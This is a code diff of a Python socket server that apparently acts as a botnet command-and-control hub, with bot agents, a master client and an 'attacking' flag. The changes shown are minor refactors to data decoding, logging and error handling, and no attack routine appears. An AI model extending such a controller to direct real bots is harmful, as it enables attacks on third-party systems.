@@ -1,5 +1,4 @@
 from array import array
-from errno import ECANCELED
 import socket
 import sys
 from typing import Any
@@ -18,18 +17,18 @@ attacking: bool = False
 
 def accept_wrapper(sock: socket.socket) -> None:
     socket_list.append(sock)
+    print(f'New client connected > {str(sock.getsockname())}')
     sock.send('whoami:_'.encode(ENCODING))  # Ask client for identification
 
 
 def request_router(sock: socket.socket) -> None:
     sock_addr = sock.getsockname()
-    recv_data = sock.recv(RECV_BUFFER)
-    recv_data_str = str(recv_data, ENCODING)
-    print(f'received request from ${recv_data_str}')
+    recv_data = sock.recv(RECV_BUFFER).decode(ENCODING)
+    print(f'received request from ${recv_data}')
     try:
         if recv_data:
             try:
-                req_type, req_body = recv_data_str.split(':')
+                req_type, req_body = recv_data.split(':')
                 if req_type == 'iam':   # iam request applies to both master and bot agent
                     iam_handler(sock, req_body)
                 elif sock in bot_agents:
@@ -38,7 +37,7 @@ def request_router(sock: socket.socket) -> None:
                     master_handler(sock, req_type, req_body)
                 else:
                     print(
-                        f'Cannot handle request from {sock_addr}\nrequest:{recv_data_str}'
+                        f'Cannot handle request from {sock_addr}\nrequest:{recv_data}'
                     )
                     response = f'{req_type}:error:cannot handle request'.encode(
                         ENCODING)
@@ -152,7 +151,7 @@ if __name__ == "__main__":
 
     host, port = sys.argv[1], int(sys.argv[2])
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    # server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     server_socket.bind((host, port))
     server_socket.listen()
     socket_list.append(server_socket)
@@ -178,6 +177,8 @@ if __name__ == "__main__":
 
     except KeyboardInterrupt:
         print("caught keyboard interrupt, exiting")
+    except Exception as e:
+        print(e)
     finally:
         server_socket.close()
         sys.exit()
